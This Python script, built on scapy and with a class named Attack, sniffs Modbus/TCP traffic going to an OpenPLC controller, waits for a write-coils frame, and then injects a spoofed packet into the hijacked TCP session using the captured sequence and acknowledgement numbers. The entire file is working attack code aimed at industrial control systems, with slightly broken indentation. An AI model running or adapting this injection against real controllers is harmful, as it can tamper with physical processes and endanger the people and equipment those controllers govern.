from scapy.all import *
import argparse
from Modbus import Modbus
from ModbusTCP import ModbusTCP
import argparse
from termcolor import cprint

parser = argparse.ArgumentParser()

parser.add_argument('-ip','--ip_address',type=str,required=True)
parser.add_argument('-i','--interface',type=str,required=True)

class Attack:
    def sniffing(self,args):
        cprint(f"[+] Start Sniffing.....","cyan")
        while True:
            self.OPENPLC_FRAMES = sniff(iface=args.interface, count=8, lfilter=lambda x: x.haslayer(TCP)
                    and x[IP].dst == args.ip_address)
           try:
                if "x0f\\x00\\x00\\x00\\x06\\x01" in str(self.OPENPLC_FRAMES[2][Raw].load):
                    cprint(f"[+] Packet Found","cyan")
                    break
            except: pass     
    def injectPacket(self,args):
        cprint(f"[+] Injecting Packets.....","cyan")
        self.tcpdata = {
            'src': self.OPENPLC_FRAMES[3][IP].src,
            'dst': self.OPENPLC_FRAMES[3][IP].dst,
            'sport': self.OPENPLC_FRAMES[3][TCP].sport,
            'dport': self.OPENPLC_FRAMES[3][TCP].dport,
            'seq': self.OPENPLC_FRAMES[3][TCP].seq,
            'ack': self.OPENPLC_FRAMES[3][TCP].ack
            }
        PACKET = IP(src=self.tcpdata['src'], dst=self.tcpdata['dst'])/TCP(sport=self.tcpdata['sport'], dport=self.tcpdata['dport'],
			flags="PA", window=502, seq=self.tcpdata['seq'], ack=self.tcpdata['ack'])
        PACKET = PACKET/ModbusTCP()/Modbus()
        send(PACKET, verbose=0, iface=args.interface)
        PACKET.display()

if __name__ == "__main__":
    attack = Attack()
    args = parser.parse_args()
    attack.sniffing(args)
    attack.injectPacket(args)
